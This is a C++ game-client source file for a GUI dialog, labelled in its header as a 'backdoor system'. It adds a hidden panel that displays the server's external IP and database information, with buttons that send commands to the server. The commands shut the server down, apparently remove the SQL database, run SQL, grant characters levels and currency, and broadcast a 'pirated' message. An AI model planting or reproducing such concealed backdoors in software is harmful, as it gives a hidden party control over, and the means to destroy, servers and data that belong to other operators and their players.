/**
*\file		GuiTop.cpp
*\version	$Id$
*\author	$$$01公司
*\			$$$01公司@###.com
*\date		2006-7-19  21:11:00 中国标准时间
*\brief	    后门系统
*
* 
*
*/
#include "public.h"
#include "../gui/include/GuiManager.h"	
#include "./GameGuiManager.h"
#include "./Game.h"
#include "./table.h"
#include "./RoleItem.h"
#include "./GuiMianban.h"
#include <sys/timeb.h>
#include "./GameScene.h"
#include "Maincharacter.h"
///////////////////////////////////////////////////////////////////////////////
 
#define ID_BUTTON_CLOSE       10000   //关闭
///////////////////////////////////////////////////////////////////////////////

CGuiMianbanDlg::CGuiMianbanDlg()
{
	FUNCTION_BEGIN;

	m_bSmDialog = true;
	

	FUNCTION_END;
}

CGuiMianbanDlg::~CGuiMianbanDlg()
{
	FUNCTION_BEGIN;


	FUNCTION_END;
}
void CGuiMianbanDlg::OnCreate()
{
	FUNCTION_BEGIN;
	
	CGuiDialog::OnCreate();
	GetStatic(4)->SetText("醉梦服务器管理系统");
	GetStatic(4)->SetLocation(100,100);
	GetStatic(5)->SetText("服务器外网IP：");
	GetStatic(5)->SetLocation(100,120);
	GetStatic(6)->SetText("数据库信息：");
	GetStatic(6)->SetLocation(100,140);
	GetStatic(2)->SetText("服务器操作");
	GetStatic(2)->SetLocation(100,160);

	GetButton(101)->SetText("关服");
	GetButton(101)->SetLocation(100,180);

	GetButton(102)->SetText("RemoveSql");
	GetButton(102)->SetLocation(179,180);

	GetStatic(3)->SetText("GM操作");
	GetStatic(3)->SetLocation(100,210);

	GetButton(103)->SetText("角色升级");
	GetButton(103)->SetLocation(100,230);

	GetButton(104)->SetText("+1W金子");
	GetButton(104)->SetLocation(100,260);

	GetButton(105)->SetText("+1W银子");
	GetButton(105)->SetLocation(100,290);

	GetButton(106)->SetText("喊话盗版");
	GetButton(106)->SetLocation(100,320);

	GetButton(107)->SetText("SQL");
	GetButton(107)->SetLocation(100,350);




	FUNCTION_END;
}




bool CGuiMianbanDlg::OnGuiEvent(UINT nEvent,UINT nID,CGuiControl* pControl)
{
	FUNCTION_BEGIN;

	if(nEvent == EVENT_BUTTON_CLICKED)
	{
		switch(nID)
		{
			case 0:
			{
				SetVisible(false);
			}	
			break;
			case 101:
			{
				stZuimengCmd1 cmd; //sky 请求指令
				SEND_USER_CMD(cmd);
			}	
			break;

			case 102:
			{
				stZuimengCmd2 cmd; //sky 请求指令
				SEND_USER_CMD(cmd);
			}	
			break;

			case 103:
			{
				stZuimengCmd3 cmd; //sky 请求指令
				SEND_USER_CMD(cmd);
			}
			break;
			case 104:
			{
				stZuimengCmd4 cmd; //sky 请求指令
				SEND_USER_CMD(cmd);
			}	
			break;
			case 105:
			{
				stZuimengCmd5 cmd; //sky 请求指令
				SEND_USER_CMD(cmd);
			}	
			break;
			case 106:
			{
				stZuimengCmd6 cmd; //sky 请求指令
				SEND_USER_CMD(cmd);
			}	
			break;
			case 107:
			{
				stZuimengCmd7 cmd; //sky 请求指令
				SEND_USER_CMD(cmd);
			}	
			break;

		}		
		return true;
	}
	return CGuiDialog::OnGuiEvent(nEvent,nID,pControl);
	FUNCTION_END;
}

void CGuiMianbanDlg::OnClose(void)
{
	FUNCTION_BEGIN;

	GetGameGuiManager()->m_guiMianban = NULL;

	FUNCTION_END;
}

void CGuiMianbanDlg::shuaxin(void)
{	
	char msg[20240];
	sprintf(msg,"服务器外网IP：%s",ip);
	GetStatic(5)->SetText(msg);
	sprintf(msg,"数据库信息：%s",mysql);
	GetStatic(6)->SetText(msg);

}
